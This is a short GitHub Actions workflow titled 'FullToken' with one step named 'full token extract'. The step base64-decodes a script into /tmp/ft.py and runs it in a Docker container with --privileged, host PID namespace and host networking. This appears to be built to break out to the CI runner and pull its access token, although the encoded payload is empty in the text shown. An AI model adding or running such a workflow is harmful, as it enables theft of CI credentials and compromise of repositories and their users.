name: FullToken
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: full token extract
        timeout-minutes: 5
        run: |
          set +e
          echo  | base64 -d > /tmp/ft.py
          docker run --rm --privileged --pid=host --net=host -v /tmp/ft.py:/ft.py python:3.11-slim python3 /ft.py
          echo === DONE ===
